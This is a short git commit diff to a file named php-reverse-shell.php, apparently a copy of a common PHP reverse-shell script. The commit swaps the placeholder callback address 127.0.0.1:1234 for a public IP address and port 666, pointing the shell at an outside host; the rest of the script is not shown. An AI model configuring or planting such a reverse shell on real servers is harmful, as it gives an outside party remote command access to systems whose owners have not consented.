f8c5eeeb4c2ae6d0dab2978b34b230daaa2808f0
r4staa <52297273+r4staa@users.noreply.github.com>
2019-09-18 16:34:18 -0500

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '137.117.247.28';  // CHANGE THIS
+$port = 666;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
